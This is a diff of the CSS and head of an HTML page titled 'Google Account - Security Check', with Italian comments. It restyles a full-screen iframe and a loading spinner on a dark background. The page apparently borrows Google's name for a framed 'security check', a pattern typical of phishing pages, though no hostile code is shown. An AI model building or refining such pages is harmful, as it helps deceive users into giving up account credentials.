@@ -3,45 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <meta name="theme-color" content="#000000">
+    <meta name="theme-color" content="#121212">
     <title>Google Account - Security Check</title>
     <style>
-        /* Reset totale per eliminare ogni stacco visivo */
+        /* Reset totale */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* SFONDO UNIVOCAMENTE NERO */
+        /* SFONDO UNIVOCO E CENTRAGGIO */
         body, html { 
             height: 100%; 
             width: 100%; 
             overflow: hidden; 
-            background-color: #000000; 
+            background-color: #121212; 
             font-family: 'Roboto', Arial, sans-serif;
+            /* Forza il contenuto al centro */
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
-        /* Wrapper rimosso il padding per unire i colori */
+        /* Il wrapper ora non è più absolute, così può essere centrato dal body */
         .iframe-wrapper {
-            position: absolute;
-            top: 0;
-            left: 0;
+            position: relative;
             width: 100%;
             height: 100%;
-            background-color: #000000;
+            /* Limita l'altezza se necessario, o lascialo al 100% per mobile */
+            max-height: 100vh; 
+            background-color: #121212;
             z-index: 2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
         iframe { 
             width: 100%; 
-            height: 100%; 
+            height: 90%; /* Riducendo leggermente l'altezza dell'iframe rispetto al wrapper, lo stacchiamo dal bordo superiore */
             border: none; 
             display: block;
             background-color: transparent;
         }
 
-        /* Caricamento su nero totale */
+        /* Caricamento centrato */
         .loader-container {
             display: flex;
             flex-direction: column;
@@ -53,7 +60,7 @@
             top: 0;
             left: 0;
             z-index: 1;
-            background-color: #000000;
+            background-color: #121212;
         }
 
         .spinner {
@@ -66,12 +73,6 @@
         }
 
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .loading-text {
-            color: #9aa0a6; 
-            margin-top: 20px; 
-            font-size: 14px;
-        }
     </style>
 </head>
 <body>
